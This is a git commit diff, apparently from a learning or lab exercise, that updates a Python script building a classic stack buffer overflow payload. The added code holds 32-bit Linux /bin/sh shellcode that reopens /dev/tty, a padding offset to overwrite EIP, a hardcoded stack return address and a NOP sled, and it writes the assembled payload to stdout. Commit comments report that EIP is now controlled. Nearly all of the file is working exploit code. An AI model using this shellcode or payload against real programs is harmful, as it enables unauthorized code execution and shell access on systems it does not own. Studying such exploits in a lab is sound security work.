bfe00ccc9e09574350f3bb5828fc7744ac42abac
Kian <68297864+Sine-Of-Time@users.noreply.github.com>
2025-04-09 16:46:14 -0400

    Update attack2.py

--- Buffer_OverflowBroke/attack2.py
+++ Buffer_OverflowBroke/attack2.py
@@ -2,24 +2,34 @@
 import sys
 import struct
 
-#shellcode = (
-#    b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
-#)
+# Example shellcode (32-bit Linux /bin/sh)
+shellcode = (
+    b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3"
+    b"\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh"
+    b"\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+)
 
-#ret_address =  0x28d4ffff #  Address of buffer in stack, may change
-#ret_address_bytes = struct.pack("<I", ret_address)
+# 1) Figure out the correct offset to EIP (assume 20 for now)
+offset = 20
 
-#nop_sled_size = 30 #This is where the issues begin as of 3/29/25
-#nop_sled = b"\x90" * nop_sled_size
+# 2) Decide on a return address (from gdb or trial and error)
+#return_address = 0xffffd6d1
+return_address = 0xffffd278 #This will prbly be different for you
+ret_addr_bytes = struct.pack("<I", return_address)
 
-#    [ 'A'*offset ] + [ ret_address ] + [ NOP sled ] + [ shellcode ]
-#payload = b"A" * 20
-#payload += ret_address_bytes
-#payload += nop_sled
-#payload += shellcode
+# Print out ret_addr_bytes
+#print(f"Return address bytes: {ret_addr_bytes}")
 
-payload = b"A" * 20 + b"0xffffd6d1" + b"\x90" * 16 + b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+# 3) Choose a NOP sled size
+nop_sled_size = 32
+nop_sled = b"\x90" * nop_sled_size
 
+# Construct payload
+payload  = b"A" * offset
+payload += ret_addr_bytes
+payload += nop_sled
+payload += shellcode
+
+# Write to stdout
 sys.stdout.buffer.write(payload)
-#As of 3/29/25, the curent issues is finding the amount of NOP sled needed to get the shellcode to run or 
-#something else that is causing the shellcode to not run.
+#So buffer is being overflowed and eip is the desired address after seg fault
